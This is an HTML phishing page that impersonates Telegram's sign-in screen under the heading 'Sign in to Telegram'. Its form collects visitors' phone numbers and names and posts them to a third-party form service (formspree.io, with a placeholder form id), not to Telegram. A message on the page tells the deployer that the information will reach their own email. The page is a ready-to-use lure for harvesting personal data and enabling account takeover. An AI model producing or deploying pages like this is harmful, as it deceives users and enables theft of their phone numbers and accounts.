<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Telegram-style Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #e9ebee;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background: #ffffff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 400px;
      text-align: center;
    }
    .login-box h2 {
      color: #0088cc;
      margin-bottom: 20px;
    }
    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 16px;
    }
    .login-box button {
      width: 100%;
      background: #0088cc;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
    .success {
      color: green;
      margin-top: 10px;
    }
  </style>
</head>
<body>  <div class="login-box">
    <h2>Sign in to Telegram</h2><form action="https://formspree.io/f/your-form-id" method="POST">
  <input type="tel" name="Phone Number" placeholder="+251912345678" required />
  <input type="text" name="Name" placeholder="Your Name" required />
  <button type="submit">Submit</button>
</form>

<p class="success" id="successMsg">âœ… Info will be sent to your email!</p>

  </div></body>
</html>
